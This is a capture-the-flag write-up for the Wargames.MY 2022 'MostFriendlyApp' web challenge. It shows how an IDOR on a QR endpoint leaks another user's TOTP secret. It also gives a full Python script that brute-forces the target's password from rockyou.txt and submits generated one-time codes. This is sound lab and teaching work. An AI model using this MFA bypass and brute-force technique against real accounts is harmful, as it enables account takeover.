---
layout: post
title: MostFriendlyApp (web)
ctf: Wargames.MY 2022
permalink: /WargamesMY2022/MostFriendlyApp
---

This web challenge did not provide source code so it is completely blackbox testing. Btw I did not manage to solve all questions on time because of some health related reason 😷.

## Overview

> 🚧 **Description** : I created an account in this website, but lost my authenticator and forgot my password. Can you help me to get my account back? My username is `godam`

Before attacking the system, I prefer to understand the system first in term of functionality/features or flow. Basically the challenge have features like:
* Pre Auth
1. Register account
2. Verify account
3. Login
* Post Auth
1. Insert Notes
2. Logout

After register an account, the user will be asked to verify new account. So the server make a request at endpoint `/getQR.php?username={anyusername}` with current registered username to get the QR code. Maybe we can get an IDOR here like entering `godam's` username.

![img1][img1]

The QR code contains [TOTP](https://en.wikipedia.org/wiki/Time-based_one-time_password) thingy such as secret value and user can scan it with Google/Microsoft Authenticator to get the passcode. Noted that passcode will change for every 30 seconds. In linux, we can use `oathtool` to get totp passcode from secret key.

```bash                                                                                 
❯ oathtool -b --totp 'RUKTVQSRTNNBWNPCBVHK7TNLW2MBUUW5XWF5HJAUUEPVZVCHIKN3PGBFPTLRJQQ3NQGFX3BKYWXO4DUNEYOT5DSL7KC7K6K5RD32PIY' 
188176
                                                                           
❯ oathtool -b --totp 'RUKTVQSRTNNBWNPCBVHK7TNLW2MBUUW5XWF5HJAUUEPVZVCHIKN3PGBFPTLRJQQ3NQGFX3BKYWXO4DUNEYOT5DSL7KC7K6K5RD32PIY' 
188176
                                                                                 
❯ oathtool -b --totp 'RUKTVQSRTNNBWNPCBVHK7TNLW2MBUUW5XWF5HJAUUEPVZVCHIKN3PGBFPTLRJQQ3NQGFX3BKYWXO4DUNEYOT5DSL7KC7K6K5RD32PIY' 
929421
```
Now we have TOTP passcode, an user account but we dont have his password. Then hint was released saying that `It is required to brute force his password to solve it`.

## Solution

Since we already know the username and passcode, we just have to bruteforce password field on login form. So the flow is something like this:
1. First, I try to login with `godam` as username and any password from rockyou.txt as password
2. Then, sends totp code for `godam`

If the system validate the passcode, we will found the correct password for `godam`. I using python script for bruteforce automation and [oathtool](https://pypi.org/project/oathtool/) to retrieve passcode. Here is the full script and of course we can make the script shorter but hey, as long its work im not gonna touch it.

```py
import requests
import oathtool
import time

cookies = {
    'PHPSESSID': '99uc5a5630dbiltiek8nfud4v5',
}

def passcode(secret):
    t = time.localtime(time.time())
    time_in_seconds = t.tm_sec

    if time_in_seconds % 30 > 28:
        time.sleep(3)
    
    totp = oathtool.generate_otp(secret)

    headers = {
        'Host': 'mfa.wargames.my',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://mfa.wargames.my',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': 'http://mfa.wargames.my/verify.php',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
    }

    data = {
        'otp': f"{totp}",
    }

    response = requests.post('http://mfa.wargames.my/verify.php', cookies=cookies, headers=headers, data=data, verify=False, allow_redirects=True)
    return response.text

def login(passwd):
    params = {
        'username': 'godam',
        'password': f"{passwd}",
    }

    headers = {
        'Host': 'mfa.wargames.my',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': 'http://mfa.wargames.my/login.php',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
    }
    response = requests.get('http://mfa.wargames.my/login.php', params=params, cookies=cookies, headers=headers, verify=False)
    return response.status_code

filename = "/usr/share/dirb/wordlists/rockyou.txt"
secret_godam = "RUKTVQSRTNNBWNPCBVHK7TNLW2MBUUW5XWF5HJAUUEPVZVCHIKN3PGBFPTLRJQQ3NQGFX3BKYWXO4DUNEYOT5DSL7KC7K6K5RD32PIY" # user godam

with open(filename) as file:
    for passwd in file:
        login_stcode = login(passwd.rstrip())

        if login_stcode == 200:
            if "Verified!" in passcode(secret_godam):
                print(f"Valid password for godam: {passwd}")
                exit()
            else:
                print(f"Invalid password for godam: {passwd}")
                time.sleep(1.5)
        else:
            print(f"Error on login")
            exit()
```

<!-- [img1]:{{site.baseurl}}/images/2022-12-26/passcode.png -->
[img1]:{{site.baseurl}}/ctfs/WargamesMY2022/MostFriendlyApp/images/passcode.png